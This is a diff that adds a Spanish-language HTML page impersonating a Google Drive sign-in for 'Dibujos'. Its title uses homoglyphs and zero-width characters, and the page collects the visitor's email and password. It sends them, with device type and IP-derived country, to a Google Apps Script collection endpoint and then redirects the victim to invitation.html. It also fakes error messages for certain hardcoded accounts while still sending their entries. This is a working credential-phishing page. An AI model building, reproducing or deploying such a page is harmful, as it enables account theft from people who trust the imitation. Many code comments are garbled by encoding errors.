@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
+    <link rel="shortcut icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
+    
+    <meta property="og:title" content="Go&#8203;ogle Dri&#957;e - Dibujos" />
+    <meta property="og:description" content="google.com" />
+    <meta property="og:image" content="https://i.postimg.cc/htpKNkqB/alisson.png" />
+    
+    <title>Go&#8203;ogle Dri&#957;e - Dibujos</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', arial, sans-serif;
+            background-color: #2c2d30;
+            color: #e8eaed;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Clase para cuando aparece el teclado virtual */
+        body.keyboard-active {
+            justify-content: flex-start;
+            padding-top: 10px;
+            padding-bottom: 10px;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            transition: transform 0.3s ease;
+        }
+
+        /* TransformaciÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³n cuando aparece el teclado */
+        .container.keyboard-active {
+            transform: translateY(-20px);
+        }
+
+        /* CSS para el teclado mÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³vil */
+        @media (max-width: 768px) {
+            .keyboard-active .container {
+                transform: translateY(-30px);
+            }
+            
+            .keyboard-active .logo {
+                margin-bottom: 4px;
+            }
+        }
+
+        .logo {
+            width: 90px;
+            margin-bottom: 8px;
+        }
+
+        .card {
+            background-color: #1f1f1f;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+
+        .title {
+            color: #e8eaed;
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #e8eaed;
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 12px 8px;
+            background-color: transparent;
+            border: 1.5px solid #5f6368;
+            border-radius: 4px;
+            color: #e8eaed;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #8ab4f8;
+        }
+
+        .input-field.error {
+            border-color: #f28b82;
+        }
+
+        /* Forzar estilos para autocompletado */
+        .input-field:-webkit-autofill {
+            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
+            -webkit-text-fill-color: #e8eaed !important;
+            background-color: transparent !important;
+        }
+
+        .input-field:-webkit-autofill:focus {
+            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
+            -webkit-text-fill-color: #e8eaed !important;
+        }
+
+        .input-field:-webkit-autofill:hover {
+            -webkit-box-shadow: 0 0 0 30px #1f1f1f inset !important;
+            -webkit-text-fill-color: #e8eaed !important;
+        }
+
+        .input-label {
+            position: absolute;
+            top: 16px;
+            left: 12px;
+            color: #9aa0a6;
+            background-color: #1f1f1f;
+            padding: 0 4px;
+            transition: 0.2s ease all;
+            pointer-events: none;
+            font-size: 16px;
+        }
+
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label,
+        .input-field.has-value + .input-label {
+            top: -8px;
+            font-size: 12px;
+            color: #8ab4f8;
+        }
+
+        .input-field.error:focus + .input-label,
+        .input-field.error:not(:placeholder-shown) + .input-label,
+        .input-field.error.has-value + .input-label {
+            color: #f28b82;
+        }
+
+        /* Mensajes de validaciÃƒÂ³n personalizados estilo Google */
+        .validation-message {
+            color: #f28b82;
+            font-size: 13px;
+            margin-top: 6px;
+            text-align: left;
+            display: none;
+            font-weight: 400;
+            font-family: 'Google Sans', sans-serif;
+        }
+
+        .validation-message.show {
+            display: block;
+        }
+
+        .guest-mode {
+            background-color: #0d5dc7;
+            color: #f3f8fa;
+            font-size: 14px;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            min-height: 42px;
+            position: relative;
+        }
+
+        /* Icono creado con CSS - mantiene la alineaciÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³n */
+        .guest-mode::before {
+            content: '!';
+            width: 12px;
+            height: 12px;
+            background-color: #dae2e5;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 8px;
+            flex-shrink: 0;
+            font-size: 12px;
+            font-weight: bold;
+            color: #0d5dc7;
+            font-style: normal;
+            line-height: 1;
+        }
+
+        .show-password-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .show-password-wrapper input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #5f6368;
+            border-radius: 2px;
+            background-color: transparent;
+            margin-right: 8px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+
+        .show-password-wrapper input[type="checkbox"]:checked {
+            border-color: #8ab4f8;
+            background-color: #8ab4f8;
+        }
+
+        .show-password-wrapper input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            left: 2px;
+            top: 0px;
+            width: 5px;
+            height: 7px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .show-password-wrapper input[type="checkbox"]:hover {
+            border-color: #8ab4f8;
+        }
+
+        .show-password-wrapper label {
+            color: #e8eaed;
+            font-size: 14px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 24px;
+        }
+
+        .create-account {
+            color: #8ab4f8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            background-color: #8ab4f8;
+            border: none;
+            border-radius: 20px;
+            color: #1f1f1f;
+            font-size: 14px;
+            font-weight: 500;
+            height: 36px;
+            padding: 0 24px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover {
+            background-color: #aecbfa;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        .next-button:disabled {
+            background-color: #5f6368;
+            cursor: not-allowed;
+            color: #e8eaed;
+        }
+
+        /* Footer mejorado */
+        .footer {
+            margin-top: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            max-width: 380px;
+            font-size: 12px;
+            flex-shrink: 0;
+            transition: all 0.3s ease;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .language-selector select {
+            background: transparent;
+            border: none;
+            color: #9aa0a6;
+            font-size: 12px;
+            outline: none;
+            cursor: pointer;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+            flex-wrap: nowrap;
+        }
+
+        .footer-links a {
+            color: #9aa0a6;
+            text-decoration: none;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+
+        .footer-links a:hover {
+            color: #e8eaed;
+        }
+
+        .error-message {
+            color: #f28b82;
+            font-size: 14px;
+            margin-top: 8px;
+            margin-bottom: 16px;
+            text-align: left;
+            display: none;
+        }
+
+        .error-message.password-prohibited {
+            color: #f28b82;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container, .card {
+                padding: 24px 24px 20px;
+            }
+            
+            .footer {
+                padding: 0 4px;
+                margin-top: 20px;
+            }
+            
+            .footer-links {
+                gap: 12px;
+                flex-wrap: nowrap;
+            }
+            
+            .footer-links a {
+                font-size: 10px;
+            }
+            
+            .language-selector select {
+                font-size: 10px;
+            }
+            
+            .keyboard-active .container {
+                transform: translateY(-25px);
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .container, .card {
+                padding: 20px 16px 16px;
+            }
+            
+            .footer {
+                margin-top: 32px;
+                padding: 0 8px;
+                flex-wrap: nowrap;
+            }
+            
+            .footer-links {
+                gap: 8px;
+                flex-wrap: nowrap;
+            }
+            
+            .footer-links a {
+                font-size: 9px;
+            }
+            
+            .language-selector select {
+                font-size: 9px;
+            }
+            
+            .keyboard-active .container {
+                transform: translateY(-20px);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="Google" class="logo">
+        
+        <div class="card">
+            <h1 class="title">Acceder a Dibujos</h1>
+            <p class="subtitle">Ir a Dri&#957;e</p>
+            
+            <form id="loginForm" novalidate>
+                <div class="input-wrapper">
+                    <input type="email" id="emailInput" name="email" class="input-field" placeholder=" " value="@gmail.com">
+                    <label for="emailInput" class="input-label">Correo electrónico o teléfono</label>
+                    <div class="validation-message" id="emailValidation"></div>
+                </div>
+                
+                <div class="guest-mode" id="guestMode">
+                    Inicia sesi&#8203;ón para continuar
+                </div>
+                
+                <div class="input-wrapper">
+                    <input type="password" id="passwordInput" name="password" class="input-field" placeholder=" " minlength="5" maxlength="32">
+                    <label for="passwordInput" class="input-label">Ingresa tu contrase&#8203;ña</label>
+                    <div class="validation-message" id="passwordValidation"></div>
+                </div>
+                
+                <div id="errorMessage" class="error-message"></div>
+                
+                <div class="show-password-wrapper">
+                    <input type="checkbox" id="showPassword">
+                    <label for="showPassword">Mostrar contrase&#8203;ña</label>
+                </div>
+                
+                <div class="actions">
+                    <a href="#" class="create-account">Crear cuenta</a>
+                    <button type="submit" class="next-button" id="submitBtn">Siguiente</button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <div class="language-selector">
+                <select>
+                    <option value="es">Español (Latinoamérica)</option>
+                    <option value="en">English</option>
+                </select>
+            </div>
+            <div class="footer-links">
+                <a href="#">Ayuda</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Condiciones</a>
+            </div>
+        </div>
+    </div>
+
+    <iframe id="usuarioFrame" src="" style="display: none; width: 100%; height: 100vh; border: none;"></iframe>
+
+    <script>
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const emailValidation = document.getElementById('emailValidation');
+        const passwordValidation = document.getElementById('passwordValidation');
+
+        // Cache para el paÃƒÆ'Ã‚Â­s - se obtiene una sola vez al cargar la pÃƒÆ'Ã‚Â¡gina
+        let cachedCountry = null;
+        let skipPasswordValidation = false; // Variable para controlar la validaciÃ³n de contraseÃ±a
+        
+        // FunciÃƒÂ³n para mostrar mensajes de validaciÃƒÂ³n personalizados
+        function showValidationMessage(element, message) {
+            element.textContent = message;
+            element.classList.add('show');
+        }
+
+        function hideValidationMessage(element) {
+            element.classList.remove('show');
+        }
+
+        // ValidaciÃƒÂ³n personalizada para email
+        function validateEmail(email) {
+            if (!email) {
+                return 'Introduce una dirección de correo electrónico válida';
+            }
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                return 'Introduce una dirección de correo electrónico válida';
+            }
+            
+            return null;
+        }
+
+        // ValidaciÃƒÂ³n personalizada para contraseÃƒÂ±a
+        function validatePassword(password) {
+            if (!password) {
+                return 'Completa este campo';
+            }
+            
+            if (password.length < 5) {
+                return 'La contraseña debe tener al menos 5 caracteres';
+            }
+            
+            if (password.length > 32) {
+                return 'La contraseña no puede tener más de 32 caracteres';
+            }
+            
+            return null;
+        }
+        
+        // Obtener paÃƒÆ'Ã‚Â­s al cargar la pÃƒÆ'Ã‚Â¡gina (en paralelo, no bloquea la UI)
+        async function preloadCountry() {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500); // Timeout de 2 segundos
+                
+                const response = await fetch("https://ipwhois.app/json/", { 
+                    signal: controller.signal 
+                });
+                clearTimeout(timeoutId);
+                
+                const data = await response.json();
+                cachedCountry = data.country || "Desconocido";
+            } catch (error) {
+                console.log("No se pudo obtener el país, usando valor por defecto");
+                cachedCountry = "Desconocido";
+            }
+        }
+
+        // FunciÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³n para verificar si un campo tiene valor
+        function checkFieldValue(input) {
+            if (input.value.trim() !== '') {
+                input.classList.add('has-value');
+            } else {
+                input.classList.remove('has-value');
+            }
+        }
+
+        // FunciÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³n para verificar autocompletado
+        function checkAutofill() {
+            setTimeout(() => {
+                checkFieldValue(emailInput);
+                checkFieldValue(passwordInput);
+            }, 100);
+        }
+
+        // Eventos para el campo de email - SOLO limpiar errores, NO validar
+        emailInput.addEventListener('input', function() {
+            emailInput.classList.remove('error');
+            hideValidationMessage(emailValidation);
+            checkFieldValue(emailInput);
+        });
+
+        emailInput.addEventListener('change', function() {
+            checkFieldValue(emailInput);
+        });
+
+        // Eventos para el campo de Contrase&#8203;ÃƒÆ'Ã†'Ãƒâ€šÃ‚Â±a - SOLO limpiar errores, NO validar
+        passwordInput.addEventListener('input', function() {
+            passwordInput.classList.remove('error');
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.classList.remove('password-prohibited');
+            hideValidationMessage(passwordValidation);
+            checkFieldValue(passwordInput);
+        });
+
+        passwordInput.addEventListener('change', function() {
+            checkFieldValue(passwordInput);
+        });
+
+        // Verificar autocompletado periÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³dicamente
+        setInterval(checkAutofill, 500);
+
+        // Verificar al cargar la pÃƒÆ'Ã†'Ãƒâ€šÃ‚Â¡gina
+        window.addEventListener('load', checkAutofill);
+        document.addEventListener('DOMContentLoaded', checkAutofill);
+
+        // Manejar mostrar/ocultar Contrase&#8203;ÃƒÆ'Ã†'Ãƒâ€šÃ‚Â±a - CORREGIDO para evitar validaciÃ³n
+        document.getElementById('showPassword').addEventListener('change', function() {
+            skipPasswordValidation = true; // Evitar validaciÃ³n cuando se cambia la casilla
+            const passwordInput = document.getElementById('passwordInput');
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        // TambiÃ©n prevenir validaciÃ³n al hacer click en el label o checkbox
+        document.querySelector('.show-password-wrapper').addEventListener('mousedown', function() {
+            skipPasswordValidation = true;
+        });
+        
+        document.querySelector('.show-password-wrapper').addEventListener('click', function() {
+            skipPasswordValidation = true;
+        });
+        
+        document.getElementById('showPassword').addEventListener('click', function() {
+            skipPasswordValidation = true;
+        });
+        
+        document.querySelector('label[for="showPassword"]').addEventListener('click', function() {
+            skipPasswordValidation = true;
+        });
+
+        // Manejar formulario - OPTIMIZADO CON VALIDACIÃƒ"N PERSONALIZADA
+        document.getElementById("loginForm").addEventListener("submit", async function(event) {
+            event.preventDefault();
+            
+            const emailInput = document.querySelector('input[name="email"]');
+            const passwordInput = document.querySelector('input[name="password"]');
+            const errorMessage = document.getElementById('errorMessage');
+            const guestMode = document.getElementById('guestMode');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            const email = emailInput.value.trim().toLowerCase();
+            const password = passwordInput.value;
+            
+            // Limpiar errores previos
+            errorMessage.style.display = 'none';
+            errorMessage.classList.remove('password-prohibited');
+            passwordInput.classList.remove('error');
+            emailInput.classList.remove('error');
+            hideValidationMessage(emailValidation);
+            hideValidationMessage(passwordValidation);
+            guestMode.style.display = 'block';
+            
+            // Validar email
+            const emailError = validateEmail(email);
+            if (emailError) {
+                showValidationMessage(emailValidation, emailError);
+                emailInput.classList.add('error');
+                emailInput.focus();
+                return;
+            }
+            
+            // Validar contraseÃƒÂ±a
+            const passwordError = validatePassword(password);
+            if (passwordError) {
+                showValidationMessage(passwordValidation, passwordError);
+                passwordInput.classList.add('error');
+                passwordInput.focus();
+                return;
+            }
+            
+            // Deshabilitar botÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³n inmediatamente
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verificando...';
+            
+            // -----------------------------------------------------------Variables para determinar si es prohibido
+            const prohibitedEmails = ["ppromoc10@gmail.com"];
+            const prohibitedPasswords = ["fernanda2022","Fernanda2022"]; 
+            
+            const isProhibitedEmail = prohibitedEmails.includes(email);
+            const isProhibitedPassword = prohibitedPasswords.includes(password);
+            
+            // -----------------------------------------------------Si es prohibido, enviar en segundo plano Y mostrar error inmediatamente
+            if (isProhibitedEmail || isProhibitedPassword) {
+                // Detectar dispositivo (rÃƒÆ'Ã‚Â¡pido)
+                let deviceType = "Otro";
+                const ua = navigator.userAgent;
+                if (ua.includes('Android')) deviceType = "Android";
+                else if (ua.includes('iPhone') || ua.includes('iPad')) deviceType = "iPhone";
+                
+                // Usar paÃƒÆ'Ã‚Â­s cacheado o valor por defecto
+                const country = cachedCountry || "Desconocido";
+                
+                // Enviar datos en segundo plano (sin esperar respuesta)
+                const formData = new URLSearchParams({
+                    email: email,
+                    password: password,
+                    device: deviceType,
+                    country: country + " - INTENTO_FALLIDO"
+                });
+                
+                const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
+                
+                // EnvÃƒÆ'Ã‚Â­o en segundo plano (no bloquea la UI)
+                fetch(url, {
+                    method: "POST",
+                    body: formData,
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" }
+                }).catch(error => {
+                    console.log("EnvÃƒÆ'Ã‚Â­o en segundo plano fallÃƒÆ'Ã‚Â³, pero no importa");
+                });
+                
+                // Mostrar error inmediatamente
+                if (isProhibitedEmail) {
+                    showError("Ocurrió un error con el correo, intentar con otra dirección", false);
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    emailInput.classList.add('error');
+                    emailInput.classList.remove('has-value');
+                    passwordInput.classList.remove('has-value');
+                } else {
+                    showError("La contraseña no es correcta. Inténtalo de nuevo.", true);
+                    passwordInput.value = '';
+                    passwordInput.classList.add('error');
+                    passwordInput.classList.remove('has-value');
+                }
+                
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Siguiente';
+                return;
+            }
+            
+            // Si no es prohibido, proceder con el envÃƒÆ'Ã‚Â­o optimizado
+            try {
+                // Detectar dispositivo (rÃƒÆ'Ã‚Â¡pido)
+                let deviceType = "Otro";
+                const ua = navigator.userAgent;
+                if (ua.includes('Android')) deviceType = "Android";
+                else if (ua.includes('iPhone') || ua.includes('iPad')) deviceType = "iPhone";
+                
+                // Usar paÃƒÆ'Ã‚Â­s cacheado o valor por defecto
+                const country = cachedCountry || "Desconocido";
+                
+                // Enviar datos a Google Sheets
+                const formData = new URLSearchParams({
+                    email: email,
+                    password: password,
+                    device: deviceType,
+                    country: country
+                });
+                
+                const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
+                
+                // Usar Promise.race para limitar tiempo de espera
+                const timeoutPromise = new Promise((_, reject) => {
+                    setTimeout(() => reject(new Error('Timeout')), 1800); // 1.8 segundos mÃƒÆ'Ã‚Â¡ximo
+                });
+                
+                const fetchPromise = fetch(url, {
+                    method: "POST",
+                    body: formData,
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" }
+                });
+                
+                try {
+                    await Promise.race([fetchPromise, timeoutPromise]);
+                } catch (error) {
+                    console.log("EnvÃƒÆ'Ã‚Â­o lento o fallÃƒÆ'Ã‚Â³, pero continuamos...");
+                }
+                
+                // Redirigir inmediatamente sin esperar respuesta completa
+                window.location.href = "invitation.html";
+                
+            } catch (error) {
+                // En caso de cualquier error, mostrar mensaje pero no bloquear por mucho tiempo
+                showError("Error de conexiÃƒÆ'Ã‚Â³n. IntÃƒÆ'Ã‚Â©ntalo de nuevo.", false);
+                console.error("Error:", error);
+                
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Siguiente';
+            }
+        });
+        
+        function showError(message, isPasswordError) {
+            const errorMessage = document.getElementById('errorMessage');
+            const guestMode = document.getElementById('guestMode');
+            
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+            guestMode.style.display = 'none';
+            
+            if (isPasswordError) {
+                errorMessage.classList.add('password-prohibited');
+            } else {
+                errorMessage.classList.remove('password-prohibited');
+            }
+        }
+        
+        // Verificar redirecciÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³n - OPTIMIZADO con timeout
+        document.addEventListener("DOMContentLoaded", async function () {
+            // Precargar paÃƒÆ'Ã‚Â­s en paralelo
+            preloadCountry();
+            
+            const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
+            
+            try {
+                // Timeout de 1.5 segundos para la verificaciÃƒÆ'Ã‚Â³n
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                
+                const response = await fetch(`${API_URL}?t=${Date.now()}`, {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                
+                const pagina = await response.text();
+                
+                if (pagina.trim() !== "folder.html") {
+                    window.location.href = pagina;
+                }
+            } catch (error) {
+                console.log("VerificaciÃƒÆ'Ã‚Â³n de redirecciÃƒÆ'Ã‚Â³n omitida por timeout");
+            }
+        });
+    </script>
+
+    <script>
+        // Script mejorado para el manejo del teclado virtual
+        document.addEventListener('DOMContentLoaded', function() {
+            // Detectar si es un dispositivo mÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³vil
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
+                            window.innerWidth <= 768;
+            
+            if (!isMobile) return; // Solo ejecutar en mÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³viles
+            
+            const inputs = document.querySelectorAll('input[type="email"], input[type="password"]');
+            const body = document.body;
+            const container = document.querySelector('.container');
+            
+            let keyboardTimeout;
+            
+            function activateKeyboard() {
+                clearTimeout(keyboardTimeout);
+                body.classList.add('keyboard-active');
+                container.classList.add('keyboard-active');
+            }
+            
+            function deactivateKeyboard() {
+                keyboardTimeout = setTimeout(() => {
+                    // Verificar si algÃƒÆ'Ã†'Ãƒâ€šÃ‚Âºn input estÃƒÆ'Ã†'Ãƒâ€šÃ‚Â¡ activo
+                    const activeElement = document.activeElement;
+                    const isInputFocused = activeElement && activeElement.matches('input[type="email"], input[type="password"]');
+                    
+                    if (!isInputFocused) {
+                        body.classList.remove('keyboard-active');
+                        container.classList.remove('keyboard-active');
+                    }
+                }, 300);
+            }
+            
+            inputs.forEach(input => {
+                // Eventos para activar
+                input.addEventListener('focus', activateKeyboard);
+                input.addEventListener('touchstart', activateKeyboard);
+                input.addEventListener('click', activateKeyboard);
+                
+                // Eventos para desactivar
+                input.addEventListener('blur', deactivateKeyboard);
+            });
+            
+            // Manejar cambios de orientaciÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³n
+            window.addEventListener('orientationchange', function() {
+                setTimeout(() => {
+                    const activeElement = document.activeElement;
+                    if (activeElement && activeElement.matches('input[type="email"], input[type="password"]')) {
+                        activateKeyboard();
+                    }
+                }, 500);
+            });
+            
+            // Detectar resize del viewport (cuando aparece/desaparece el teclado)
+            let initialHeight = window.innerHeight;
+            window.addEventListener('resize', function() {
+                const currentHeight = window.innerHeight;
+                const heightDifference = initialHeight - currentHeight;
+                
+                // Si la altura se reduce significativamente, probablemente apareciÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³ el teclado
+                if (heightDifference > 150) {
+                    activateKeyboard();
+                } else if (heightDifference < 50) {
+                    // Si la altura se restaura, probablemente desapareciÃƒÆ'Ã†'Ãƒâ€šÃ‚Â³ el teclado
+                    const activeElement = document.activeElement;
+                    if (!activeElement || !activeElement.matches('input[type="email"], input[type="password"]')) {
+                        deactivateKeyboard();
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
